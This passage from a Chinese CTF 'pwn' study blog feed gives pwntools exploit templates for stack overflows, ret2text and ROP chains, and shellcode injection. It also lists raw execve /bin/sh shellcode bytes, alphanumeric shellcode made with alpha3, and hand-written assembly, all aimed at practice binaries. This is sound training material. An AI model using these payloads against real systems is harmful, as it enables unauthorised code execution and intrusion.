<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ebp=0x0804859b</span></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*(0x2c+4)+p32(0x8048586)+p32(0x804859D)+p32(ebp)+p32(0xACACACAC)+p32(0x8048606)+p32(ebp)+p32(0xBDBDBDBD)</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>pwn(部分shellcode总结)</title>
    <url>/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>这里的shellcode的题目都是利用栈溢出了</p>
<p>shellcode的获取方法：</p>
<ol>
<li>利用pwntools的shellcraft模块</li>
<li><a href="http://shell-storm.org/shellcode/">网上查询</a></li>
</ol>
<ul>
<li><a href="#%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5shellcode">直接写入shellcode</a><ul>
<li><a href="#1.32%E4%BD%8D">1.32位</a></li>
<li><a href="#1.64%E4%BD%8D">1.64位</a></li>
</ul>
</li>
<li><a href="#%E5%9C%A8bss%E6%AE%B5%E5%86%99%E5%85%A5shellcode">在bss段写入shellcode</a><ul>
<li><a href="#2.32%E4%BD%8D">2.32位</a></li>
<li><a href="#2.64%E4%BD%8D">2.64位</a></li>
</ul>
</li>
<li><a href="#pwntools%E7%9A%84shellcode%E9%95%BF%E5%BA%A6%E8%BF%87%E9%95%BF%E5%88%A9%E7%94%A8%E7%BD%91%E4%B8%8A%E6%89%BE%E7%9A%84shellcode">pwntools的shellcode长度过长利用网上找的shellcode</a></li>
<li><a href="#shellcode%E6%98%AF%E9%9C%80%E8%A6%81%E7%94%B1%E5%A4%A7%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D%E5%8F%8A%E6%95%B0%E5%AD%97%E6%9E%84%E6%88%90">shellcode是需要由大小写字母及数字构成</a></li>
<li><a href="#shellcode%E5%BC%80%E5%A4%B4%E4%B8%BA%60%5Cx00%60">shellcode开头为<code>\x00</code></a></li>
<li><a href="#%E6%89%8B%E5%8A%A8%E5%86%99shellcode">手动写shellcode</a><ul>
<li><a href="#x64">x64</a></li>
<li><a href="#x32">x32</a></li>
</ul>
</li>
<li><a href="#%E6%89%8B%E5%86%99open%EF%BC%8Cread%EF%BC%8Cwrite%E7%9A%84shellcode">手写open，read，write的shellcode</a></li>
</ul>
<h2 id="直接写入shellcode"><a href="#直接写入shellcode" class="headerlink" title="直接写入shellcode"></a>直接写入shellcode</h2><h3 id="1-32位"><a href="#1-32位" class="headerlink" title="1.32位"></a>1.32位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./elf&#x27;)</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./elf&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload1=shellcode</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="1-64位"><a href="#1-64位" class="headerlink" title="1.64位"></a>1.64位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./elf&#x27;)</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./elf&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line">payload1=shellcode</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="在bss段写入shellcode"><a href="#在bss段写入shellcode" class="headerlink" title="在bss段写入shellcode"></a>在bss段写入shellcode</h2><h3 id="2-32位"><a href="#2-32位" class="headerlink" title="2.32位"></a>2.32位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x804A080</span> <span class="comment">#根据实际情况</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxx&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line"></span><br><span class="line">payload1=shellcode.ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>)+p32(buf2)  <span class="comment">#偏移量根据实际请况</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-64位"><a href="#2-64位" class="headerlink" title="2.64位"></a>2.64位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) <span class="comment"># 修改了arch为&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保持连接信息不变</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保使用的是64位shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x601000</span> <span class="comment"># 示例地址，实际使用时请替换为目标程序中的正确地址</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxx&quot;</span>) <span class="comment">#根据实际情况,也可能没有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload，注意使用p64()来适应64位地址空间</span></span><br><span class="line">payload1=shellcode.ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>)+p64(buf2) <span class="comment">#偏移量根据实际请况</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="pwntools的shellcode长度过长利用网上找的shellcode"><a href="#pwntools的shellcode长度过长利用网上找的shellcode" class="headerlink" title="pwntools的shellcode长度过长利用网上找的shellcode"></a>pwntools的shellcode长度过长利用网上找的shellcode</h2><p>例题ctfshow pwn61,这里还有注意有个leave不能直接在栈上写入shellcode，shellcode要放在v5之后即要放在v5首地址的24+8字节后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./pwn61&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;域名&quot;,端口)</span></span><br><span class="line">shellcode =<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><span class="comment"># 22bytes</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode=b&#x27;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb 0\x3b\x54\x5a\x54\x5e\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode =b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f \x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#shellcode =b&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27; 32位</span></span><br><span class="line"><span class="comment">#shellcode =b&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27; 32位</span></span><br><span class="line"><span class="comment">#shellcode =b&#x27;(\x6A)\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\x6A\x0B\x58\xCD\x80&#x27; 32位</span></span><br><span class="line"><span class="comment">#shellcode =b&#x27;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0A&#x27; 纯ASCII</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s this : [&quot;</span>)</span><br><span class="line"></span><br><span class="line">v5=<span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shellcode:&quot;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v5:&quot;</span>,<span class="built_in">hex</span>(v5))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;But how to use it?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">24</span>+p64(v5+<span class="number">32</span>)+shellcode</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellcode是需要由大小写字母及数字构成"><a href="#shellcode是需要由大小写字母及数字构成" class="headerlink" title="shellcode是需要由大小写字母及数字构成"></a>shellcode是需要由大小写字母及数字构成</h2><p>先要下载alpha3；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure>

<p>应为github很不稳定所以这里推荐两种方法</p>
<ol>
<li>科学上网(其实是不文明上网)，自己理解<br><img src="/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/1.jpg" alt="1"></li>
<li>用bgithub.xyz替换github.com</li>
</ol>
<p>​    然后再利用pwntools生成一个shellcode<br>   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;bw&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(sc)</span><br></pre></td></tr></table></figure></p>
<p>   将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd alpha3</span><br><span class="line">python3 sc.py &gt; sc</span><br></pre></td></tr></table></figure>

<p>  使用alpha3生成string.printable （这里得用 python2）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn65&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">r.send(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellcode开头为-x00"><a href="#shellcode开头为-x00" class="headerlink" title="shellcode开头为\x00"></a>shellcode开头为<code>\x00</code></h2><p>用脚本找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">        payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">        res = disasm(payload)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            res != <span class="string">&quot;        ...&quot;</span></span><br><span class="line">            <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">            <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res</span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<p>exp模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27;)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xc0&#x27;</span>+shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="手动写shellcode"><a href="#手动写shellcode" class="headerlink" title="手动写shellcode"></a>手动写shellcode</h2><p>先学习一下<a href="https://blog.csdn.net/j284886202/article/details/133924239">怎么写入shellcode</a></p>
<p><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">32和64的系统调用表</a></p>
<p><a href="https://www.bchrt.com/tools/ascii-converter/">ASCll转16进制</a></p>
<p><a href="https://nets.ec/Alphanumeric_shellcode">查看可以被使用汇编指令</a></p>
<p><a href>在线编写汇编指令</a></p>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f;</span><br><span class="line">push rax;</span><br><span class="line">mov rdi, rsp;</span><br><span class="line">xor esi, esi;</span><br><span class="line">xor edx, edx;</span><br><span class="line">push 0x3b;</span><br><span class="line">pop rax;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>



<h3 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h2 id="手写open，read，write的shellcode"><a href="#手写open，read，write的shellcode" class="headerlink" title="手写open，read，write的shellcode"></a>手写open，read，write的shellcode</h2><p>这个就是sandbox见我的<a href="http://linkpwn.github.io/2025/03/02/sandbox%E7%BB%95%E8%BF%87/">另一篇文章</a></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>shellcode</category>
      </categories>
  </entry>
  <entry>
    <title>pwn 学习总结</title>
    <url>/2025/02/24/pwn-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="pwn-学习记录"><a href="#pwn-学习记录" class="headerlink" title="pwn 学习记录"></a>pwn 学习记录</h1><ul>
<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA">1.栈溢出</a><ul>
<li><a href="#%E8%B0%83%E7%94%A8%E5%B7%B2%E6%9C%89%E7%9A%84system">1.调用已有的system</a></li>
<li><a href="#%E8%B0%83%E7%94%A8%E5%B7%B2%E6%9C%89%E7%9A%84system%E4%BD%86%E8%A6%81%E4%BC%A0%E5%8F%82">2.调用已有的system但要传参</a></li>
<li><a href="#bss%E6%AE%B5%E5%86%99%E5%85%A5shellcode">3.bss段写入shellcode</a></li>
</ul>
</li>
</ul>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="调用已有的system"><a href="#调用已有的system" class="headerlink" title="调用已有的system"></a>调用已有的system</h3><ol>
<li><p>32位的模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0x12</span>+<span class="number">4</span> <span class="comment">#根据具体情况算出偏移量</span></span><br><span class="line">system = <span class="number">0x008048521</span> <span class="comment">#根据具体情况</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxx&quot;</span>) <span class="comment">#xxxx根据具体情况改，也可能没有</span></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*offset+p32(system)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>64为模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0x14</span> + <span class="number">0x08</span>  <span class="comment">#根据具体情况算出偏移量</span></span><br><span class="line">system = <span class="number">0x0400657</span>    <span class="comment">#根据具体情况</span></span><br><span class="line">ret=<span class="number">0x0000000000400287</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;xxxxxx&quot;</span>) <span class="comment">#xxxx根据具体情况改，也可能没有</span></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*offset+p64(ret)+p64(system)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary target_binary --only &#x27;pop|ret&#x27;(target_binary换成你的文件)</span><br></pre></td></tr></table></figure>

<p>32位的比就要注意堆栈平衡就可以。</p>
</li>
</ol>
<h3 id="调用已有的system但要传参"><a href="#调用已有的system但要传参" class="headerlink" title="调用已有的system但要传参"></a>调用已有的system但要传参</h3><ol>
<li><p>32位模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0x12</span>+<span class="number">4</span> <span class="comment">#根据具体情况算出偏移量</span></span><br><span class="line">system = <span class="number">0x080483A0</span> <span class="comment">#根据具体情况</span></span><br><span class="line">binsh = <span class="number">0x8048750</span>  <span class="comment">#根据具体情况</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxxx&quot;</span>)  <span class="comment">#xxxx根据具体情况改，也可能没有</span></span><br><span class="line"><span class="comment">#payload=padding+p32(system)+p32(system的返回地址)+p32(system的参数)</span></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*offset+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


</li>
<li><p>64位模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0xa</span>+<span class="number">8</span> <span class="comment">#根据具体情况算出偏移量</span></span><br><span class="line">ret = <span class="number">0x00000000004004fe</span> </span><br><span class="line">rdi_ret = <span class="number">0x00000000004007e3</span> </span><br><span class="line">system = <span class="number">0x0000000000400520</span> </span><br><span class="line">binsh = <span class="number">0x0000000000400808</span> </span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxxxxx&quot;</span>) <span class="comment">#xxxx根据具体情况改，也可能没有</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*offset+p64(ret)+p64(rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line"><span class="comment">#这里需要考虑堆栈平衡</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary target_binary --only &#x27;pop|ret&#x27;(target_binary换成你的文件)</span><br></pre></td></tr></table></figure>

<p>注意：当没有&#x2F;bin&#x2F;sh，可以用sh来代替它</p>
</li>
</ol>
<h3 id="bss段写入shellcode"><a href="#bss段写入shellcode" class="headerlink" title="bss段写入shellcode"></a>bss段写入shellcode</h3><ol>
<li><p>32为模板(有get函数可以写入)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0x6c</span>+<span class="number">4</span>  <span class="comment">#根据具体情况算出偏移量</span></span><br><span class="line"><span class="comment">#只要是bss段的就可以</span></span><br><span class="line">buf2=<span class="number">0x804B060</span></span><br><span class="line">system=<span class="number">0x08048450</span></span><br><span class="line">get=<span class="number">0x8048420</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x0804884b</span></span><br><span class="line">pop_ebx_ret=<span class="number">0x08048409</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;xxxxxx&quot;</span>) <span class="comment">#xxxx根据具体情况改，也可能没有</span></span><br><span class="line"><span class="comment">#pop_ebp_ret可换任意值</span></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*offset+p32(get)+p32(pop_ebx_ret)+p32(buf2)+p32(system)+p32(pop_ebp_ret)+p32(buf2)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="comment">#r.recv()</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>64位模板(有get函数可以写入)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">offset = <span class="number">0xa</span>+<span class="number">8</span></span><br><span class="line"><span class="comment">#只要是bss段的就可以</span></span><br><span class="line">buf2=<span class="number">0x0000000000602080</span></span><br><span class="line">rdi_ret=<span class="number">0x00000000004007f3</span></span><br><span class="line">system=<span class="number">0x000000000400520</span></span><br><span class="line">get=<span class="number">0x0000000000400530</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*offset+p64(rdi_ret)+p64(buf2)+p64(get)+p64(rdi_ret)+p64(buf2)+p64(system)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>ret2text</category>
      </categories>
  </entry>
  <entry>
    <title>pwn105(栈溢出+整数安全)</title>
    <url>/2025/02/24/pwn105-%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="pwn105-栈溢出-整数安全"><a href="#pwn105-栈溢出-整数安全" class="headerlink" title="pwn105(栈溢出+整数安全)"></a>pwn105(栈溢出+整数安全)</h2><ol>
<li><p>打开IDA，分析一下</p>
<p><img src="/2025/02/24/pwn105-%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/1.png" alt="1"></p>
</li>
</ol>
<p>​    有分析可以看到v3要大于等于3小于等于8，由于int 类型所以v3得范围是0~255,256 &#x3D; 0,257 &#x3D; 2。</p>
<p>​    所以我们的范围在258~263都可以。</p>
<ol start="2">
